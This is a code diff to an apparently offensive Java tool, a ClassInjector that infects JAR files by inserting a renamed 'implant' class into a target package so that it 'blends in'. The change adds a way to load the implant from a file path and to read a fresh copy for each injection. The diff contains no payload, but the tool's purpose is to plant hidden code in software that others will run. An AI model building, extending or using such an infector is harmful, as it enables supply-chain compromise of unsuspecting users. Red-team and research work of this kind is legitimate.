@@ -15,9 +15,27 @@ import static org.example.injector.Helpers.*;
 public class ClassInjector {
     final static String IMPLANT_CLASS_NAME = "Init";
     private final Class<?> implantClass;
+    private final Path implantClassFilePath;
 
     public ClassInjector(Class<?> implantClass) {
         this.implantClass = implantClass;
+        this.implantClassFilePath = null;
+    }
+
+    public ClassInjector(Path implantClassFilePath) {
+        this.implantClass = null;
+        this.implantClassFilePath = implantClassFilePath;
+    }
+
+    // Unfortunately, ClassFile is not Cloneable so a fresh instance needs to be read for every injection
+    private ClassFile loadFreshImplantInstance() throws IOException, ClassNotFoundException {
+        if (implantClass != null) {
+            return ImplantReader.findAndReadClassFile(implantClass);
+        } else if (implantClassFilePath != null) {
+            return ImplantReader.readImplantClass(implantClassFilePath);
+        } else {
+            throw new RuntimeException("Somehow, the implant class is not specified.");
+        }
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -50,7 +68,7 @@ public class ClassInjector {
                          * Since there are other classes in this directory, the implant will blend in better here.
                          * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                          */
-                        ClassFile implant = ImplantReader.findAndReadClassFile(implantClass);
+                        ClassFile implant = loadFreshImplantInstance();
                         deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                         JarEntry newJarEntry = convertToJarEntry(implant);
                         implant.write(fiddler.addNewEntry(newJarEntry));
